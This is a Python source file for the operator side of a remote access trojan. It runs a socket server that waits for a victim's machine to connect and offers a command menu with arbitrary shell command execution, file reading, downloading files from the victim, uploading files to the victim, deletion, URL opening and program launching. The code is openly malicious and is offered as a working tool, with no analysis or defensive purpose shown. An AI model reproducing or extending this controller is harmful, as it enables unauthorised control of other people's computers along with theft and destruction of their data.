import os

location=os.getcwd()

login=os.getlogin()
ip=open(str(location)+"//source//trojan_licen//ip.txt").read()
port1=open(str(location)+"//source//trojan_licen//port.txt").read()
import socket
s=socket.socket()
host=str(ip)
port=int(port1)
help=("\*Rules :\nThe Command : \n1) get_cwd (get Your Location In the Computer)\n2) get_login (get Login Name User)\n3) get_platform (Get System Info)\n4) dir (get all file and deroctory In the computer)\n5) cd (change your location)\n6) get_ip (get the public ip adress)\n7) mkdir (create a folder)\n8) echo (create a file text and write)\n9) read_file (read content file)\n10) rm (remove file)\n11) rmdir (remove folder)\n12) download (download file from the victime computer)\n13) upload (upload a file from your computer into the victime machine)\n14) mv (change an file name or type)\n15) open_url (open an url using https:// or http://)\n16) start_file (start any file or folder in the victime machine)\n17) cmd (you can enter any cmd command)\n18) cp (you can copy any file or folder in nother direction)\n<======= if you want a help do -help")

print(help)

s.bind((host,port))
print("")
print("Server is currently running @ "+host)
print("")
print("Waiting for any incoming connection")
#os.chdir("C://Users//ASUS//Desktop//malware_by_mrx")
s.listen(1)

conn,addr = s.accept()
print("\n",addr,"Has connected to server successfully")
result_one=0
name =input("\n Enter Your Hacking Name ==> ")
while True:
    command=input(str(name)+' ==>  ')
    if command =="cmd":
        conn.send(command.encode())
        commanD=input(f"{name} >> ")
        conn.send(commanD.encode())
        reponse=conn.recv(1024)
        print(reponse.decode())


    if command == "get_cwd":
        command=command.encode()
        conn.send(command)
        print("The Code Has Benn Sendet Pleas wait ...")
        res=conn.recv(1024)
        res=res.decode()
        print("Result ==> "+res)
        result_one=0
    
    if command == "get_login":
        command=command.encode()
        conn.send(command)
        print("The Code Has Benn Sendet Pleas wait ...")
        res=conn.recv(1024)
        res=res.decode()
        print("Result ==> "+res)
        result_one=0
    
    if command == "get_platform":
        command=command.encode()
        conn.send(command)
        print("The Code Has Benn Sendet Pleas wait ...")
        res=conn.recv(1024)
        res=res.decode()
        print("Result ==> "+res)
        result_one=0

    if command == "dir":
        result_one=0
        conn.send(command.encode())
        res=conn.recv(500000)
        res=res.decode()
        print("Result ==> "+res)

    if command == "cd":
        conn.send(command.encode())
        cd_com=input("GO To ==> ")
        cd_com=str(cd_com)
        cd_com=cd_com.encode()
        conn.send(cd_com)
        res=conn.recv(1024)
        res=res.decode()
        print("Result ==> "+res)
        result_one=0


    
    if command == "start_file":
        conn.send(command.encode())
        file_name=input("File Name ==> ")
        file_name=str(file_name)
        file_name=file_name.encode()
        conn.send(file_name)
        res=conn.recv(1024)
        res=res.decode()
        print("Result ==> "+res)
        result_one=0

    if command == "mkdir":
        conn.send(command.encode())
        mkdir=input("Directory Name ==> ")
        mkdir=str(mkdir)
        mkdir=mkdir.encode()
        conn.send(mkdir)
        res=conn.recv(1024)
        res=res.decode()
        print("Result ==> "+res)
        result_one=0

    if command == "echo":
        conn.send(command.encode())
        echo=input("Echo Command ==> ")
        echo=str(echo)
        echo=echo.encode()
        conn.send(echo)
        res=conn.recv(1024)
        res=res.decode()
        print("Result ==> "+res)
        result_one=0

    if command == "read_file":
        conn.send(command.encode())
        name_file=input("File Name ==> ")
        name_file=str(name_file)
        name_file=name_file.encode()
        conn.send(name_file)
        res=conn.recv(50000)
        res=res.decode()
        print("Result ==> "+res)
        result_one=0

    if command =="rm":
        conn.send(command.encode())
        file_r=input("File Name ==> ")
        file_r=str(file_r)
        file_r=file_r.encode()
        conn.send(file_r)
        res=conn.recv(5000)
        res=res.decode()
        print("Result ==> "+res)
        result_one=0

    if command == "rmdir":
        conn.send(command.encode())
        dir_name=input("Dir Path ==> ")
        conn.send(dir_name.encode())
        res=conn.recv(5000)
        res=res.decode()
        print("Result ==> "+res)

    if  command == "download":
        conn.send(command.encode())
        file_name=input("Enter The File Name You Wont Download ==> ")
        conn.send(file_name.encode())
        data=conn.recv(100000000)
        file_n=input("Enter The File Name To register Hem ==> ")
        new_file=open(file_n,"wb")
        new_file.write(data)
        new_file.close()
        print("The File "+file_n+" Was Download !!")
    
    if command == "upload":
        conn.send(command.encode())
        up_f_name=input("Upload File Name create ==> ")
        up_f_name=up_f_name.encode()
        conn.send(up_f_name)


        up1_f_name=input("Enter Upload File Path ==> ")

        open_f=open(up1_f_name,"rb")
        data=open_f.read()
        conn.send(data)
        
        res=conn.recv(500000000)
        res=res.decode()
        print("The Result ==> "+res )
    

    if command =="mv":
        conn.send(command.encode())
        name1=input("Enter File Name ==> ")
        conn.send(name1.encode())
        name_2=input("New file Name ==> ")
        conn.send(name_2.encode())
        res=conn.recv(1024)
        print(res)

    if command =="open_url":
        conn.send(command.encode())
        url_s=input("Enter The Url ==> ")
        conn.send(url_s.encode())
        txt_res=conn.recv(1024)
        print(txt_res.decode())


    if command == "cp":
        conn.send(command.encode())
        file_001=input("Enter The File Name ==> ")
        conn.send(file_001.encode())
        file_002=input("Enter The Derection Of File ==> ")
        conn.send(file_002.encode())
        res_txt=conn.recv(10000)
        print(res_txt)

    if command == "get_ip":
        conn.send(command.encode())
        resu=conn.recv(10000)
        resu=resu.decode()
        print(resu)
        result_one=0


    if command == "cls":
        os.system("cls")
        result_one=1

    if command == "-help":
        print(help)
        result_one=1